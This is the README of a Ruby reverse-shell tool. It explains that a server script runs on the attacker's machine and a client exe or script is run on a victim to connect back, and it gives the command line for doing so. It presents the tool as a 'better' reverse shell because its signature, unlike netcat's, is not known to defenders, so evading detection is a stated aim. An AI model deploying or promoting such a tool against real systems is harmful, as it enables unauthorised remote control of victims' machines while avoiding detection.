# Ruby Reverse Shell



## Requirements:

**[!] Server that receives the reverse shell must have ruby installed, they victim doesn't**

**[!] You might need to recompile the exe, depending on your architecture.**

<br>
These are scripts/exes that can be used as a better reverse shell. It's a basic reverse shell. Same would be possible using netcat. The advantage is that this program has a unique signature while netcat's exe is known.

<br>
<br>

Host the shell_server.rb on the attacker machine and then use the shell_client.exe / shell_client.rb to connect to it by calling it with these arguments on the target.

```
.\shell_client.exe *IP* *PORT*
```
